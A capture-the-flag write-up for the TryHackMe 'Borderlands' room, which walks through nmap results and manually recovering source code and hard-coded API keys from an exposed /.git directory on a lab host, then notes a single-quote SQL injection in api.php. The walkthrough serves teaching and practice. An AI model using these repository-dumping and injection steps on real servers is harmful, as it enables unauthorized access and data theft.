# 95 - Borderlands (Mannual GIT repo exploitation, SQLI)

Room Link --> [https://tryhackme.com/room/borderlands](https://tryhackme.com/room/borderlands)

### Enumeration

{% code overflow="wrap" %}
```bash
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 1e:11:d6:ab:cc:f2:71:c8:40:e2:1d:97:07:09:6b:eb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvGF7If+TAlknFH/FDMXkhsCJ42eZhvyt/mFDlFw/JyFIWnzTarhTH8MU1o7qrTUUJ3YnlQhu2kjOVlgkL+r48ibhfkzoEmNAIy54kxFLXaC7hFkOpYPehtfCBvxzehclToZq8nsaECbPgEFFOUiFIdQ3yo87CHR1aWeaYh9KdrdObyWUsPRKqNHwVTXXUNhwlLsoJZDJccbH56rdGOpRf3oP1qqWfCUnMDN55o8fkgW0tVLdRFxvuRmlOKdEdCEB6VEDsp2z/QFtuDDSCGPwo1XDqp5SLRGIc+LKhAQZHhnBShaXmnvwLShGLqaU0EAzIBQ96dvNkkTAvZAzazMcN
| 256 cd:d6:f0:67:0e:1b:b3:2c:99:9f:7b:bb:70:42:b5:a5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaioJd8smxzz0s9lMNoVu95NxoazDCi+ZMZ+sdxtPCiGpesRMmBZjyav7T4REZyqPR6vrvKymnnRio09JGuE6E=
| 256 e1:70:d2:f4:c9:73:6c:f0:d8:1f:d4:d8:a0:9f:8c:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJsWZhy909do/TDDtLBrrwcU2A6mW99pJq4zV7IT2bG7
80/tcp open http syn-ack nginx 1.14.0 (Ubuntu)
| http-cookie-flags: 
| /: 
| PHPSESSID: 
|_ httponly flag not set
| http-git: 
| 10.10.245.245:80/.git/
| Git repository found!
| .git/config matched patterns ‘user’
| Repository description: Unnamed repository; edit this file ‘description’ to name the…
|_ Last commit message: added mobile apk for beta testing. 
| http-methods: 
|_ Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Context Information Security — HackBack 2
```
{% endcode %}

**SSH Version Username Enumeration Exploit**

<figure><img src="https://miro.medium.com/v2/resize:fit:481/0*xmweD0ML1P-DX_iG.png" alt="" height="68" width="700"><figcaption></figcaption></figure>

#### PORT 80 <a href="#a2de" id="a2de"></a>

<figure><img src="https://miro.medium.com/v2/resize:fit:463/0*PydjwJZTsDBvkRwF.png" alt="" height="98" width="674"><figcaption></figcaption></figure>

## Exploiting Git

Resource for [exploiting](https://github.com/bl4de/research/tree/master/hidden\_directories\_leaks#hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application) `/.git` dir on a webserver or we can use automated tool like GitTool or GitHack.py.

* We retrieve the log files from the Git repository located at: [http://10.10.56.231/.git/logs/HEAD](http://10.10.56.231/.git/logs/HEAD)

<figure><img src=".gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

* Let's take a look a little bit closer to sample line of this file:

```
0000000000000000000000000000000000000000 152b2d9976cd37a68fd462af8e4ce21356b5485e Context Information Security <recruitment@contextis.com> 1568122271 +0100	commit (initial): created repo
152b2d9976cd37a68fd462af8e4ce21356b5485e 93bab0a450caaa8c4d2632703636eccc69062bb4 Context Information Security <recruitment@contextis.com> 1568122438 +0100	commit: added under construction page
93bab0a450caaa8c4d2632703636eccc69062bb4 79c9539b6566b06d6dec2755fdf58f5f9ec8822f Context Information Security <recruitment@contextis.com> 1568122828 +0100	commit: added basic prototype of api gateway
79c9539b6566b06d6dec2755fdf58f5f9ec8822f b2f776a52fe81a731c6c0fa896e7f9548aafceab Context Information Security <recruitment@contextis.com> 1568122860 +0100	commit: removed sensitive data
b2f776a52fe81a731c6c0fa896e7f9548aafceab 04f1f411857cc972ae8ed5efcffa298f5f6168fb Context Information Security <recruitment@contextis.com> 1568122932 +0100	commit: added theme
04f1f411857cc972ae8ed5efcffa298f5f6168fb fee5595bb2ba1d1ab005ec3de98367fe5d021e9f Context Information Security <recruitment@contextis.com> 1568123006 +0100	commit: added white paper pdf's
fee5595bb2ba1d1ab005ec3de98367fe5d021e9f 6db3cf70b469de942f2f529166088cdfbbd5f764 Context Information Security <recruitment@contextis.com> 1568123071 +0100	commit: added mobile apk for beta testing.
```

For example, this hash `152b2d9976cd37a68fd462af8e4ce21356b5485e` is divided into 2 parts:&#x20;

1. a directory name (first two signs from hash) and,
2. filename (rest of it).

We can download the object identified by the hash `152b2d9976cd37a68fd462af8e4ce21356b5485e` by going to the url: [http://10.10.56.231/.git/objects/15/2b2d9976cd37a68fd462af8e4ce21356b5485e](http://10.10.56.231/.git/objects/15/2b2d9976cd37a68fd462af8e4ce21356b5485e)

We now have to move the downloaded file into the dummy `.git` dir we created earlier:&#x20;

{% code overflow="wrap" %}
```bash
mv 2b2d9976cd37a68fd462af8e4ce21356b5485e .git/objects/15/2b2d9976cd37a68fd462af8e4ce21356b5485e
```
{% endcode %}

To check the type of object, you can use following command:

```bash
$ git cat-file -t 152b2d9976cd37a68fd462af8e4ce21356b5485e

# outputs
commit
```

To display the content of the object, use this command:

```bash
$ git cat-file -p 152b2d9976cd37a68fd462af8e4ce21356b5485e

# outputs
tree 337c2224b69c29a0faf3143d2da16d9bb82e91fb
author Context Information Security <recruitment@contextis.com> 1568122271 +0100
committer Context Information Security <recruitment@contextis.com> 1568122271 +0100
```

In our own case, Notice that the author remove the sensitive data on the **object b2f776a52fe81a731c6c0fa896e7f9548aafceab**. The best bet is we can find the sensitive data in the **object 79c9539b6566b06d6dec2755fdf58f5f9ec8822f**.

Lets download the file: [http://10.10.56.231/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f](http://10.10.56.231/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f)

Move the file to the `79` dir.

```bash
mv c9539b6566b06d6dec2755fdf58f5f9ec8822f .git/objects/79
```

```bash
git cat-file -p 79c9539b6566b06d6dec2755fdf58f5f9ec8822f

# outputs
tree 51d63292792fb7f97728cd3dcaac3ef364f374ba
parent 93bab0a450caaa8c4d2632703636eccc69062bb4
author Context Information Security <recruitment@contextis.com> 1568122828 +0100
committer Context Information Security <recruitment@contextis.com> 1568122828 +0100
```

We got a tree **object 51d63292792fb7f97728cd3dcaac3ef364f374ba,** lets download the object file also. [http://10.10.56.231/.git/objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba](http://10.10.56.231/.git/objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba)

{% code overflow="wrap" %}
```bash
git cat-file -p 51d63292792fb7f97728cd3dcaac3ef364f374ba

# outputs
100644 blob 2229eb414d7945688b90d7cd0a786fd888bcc6a4	api.php
100644 blob 9eb9f94f73113d785e65c7e3ec0cba54e0b7cf43	functions.php
100644 blob 2a116a56a6e31ef1836796936dbc05af1f986a26	home.php
100755 blob 470cac65fcd0f8556f13997957a331628482aa96	index.html
100644 blob 4f4ced90fcad774ca4f9f966dbb227ebe7f77a83	index.php
100644 blob 6480abf34a54d3055b437766be872a13bcebdf7d	info.php
```
{% endcode %}

We have to do same thing for each of this files then use `git cat-file -p <hash-id` to read each. The sensitive data is in the `api.php` file.

Download it: [http://10.10.56.231/.git/objects/22/29eb414d7945688b90d7cd0a786fd888bcc6a4](http://10.10.56.231/.git/objects/22/29eb414d7945688b90d7cd0a786fd888bcc6a4)

```bash
git cat-file -p 2229eb414d7945688b90d7cd0a786fd888bcc6a4

# outputs
<?php

require_once("functions.php");

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
{
    die("Invalid API key");
}

if (!isset($_GET['documentid']))
{
    die("Invalid document ID");
}

/*
if (!isset($_GET['newname']) || $_GET['newname'] == "")
{
    die("invalid document name");
}
*/

$conn = setup_db_connection();

//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);

$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
if ($docDetails !== null)
{
    //print_r($docDetails);
    echo ("Document ID: ".$docDetails['documentid']."<br />");
    echo ("Document Name: ".$docDetails['documentname']."<br />");
    echo ("Document Location: ".$docDetails['location']."<br />");
}

?>%                              
```

We get the 3 flags there.

## Task 4 - sqli

We just use the `api.php` file that contains the keys, and pass in the parameters via the url.

<figure><img src=".gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

Passing `'` after the `1` value and we get an SQLI.

<figure><img src=".gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://deskel.github.io/posts/thm/borderlands" %}

[https://mecanik.dev/en/posts/tryhackme-room-borderlands/](https://mecanik.dev/en/posts/tryhackme-room-borderlands/)















































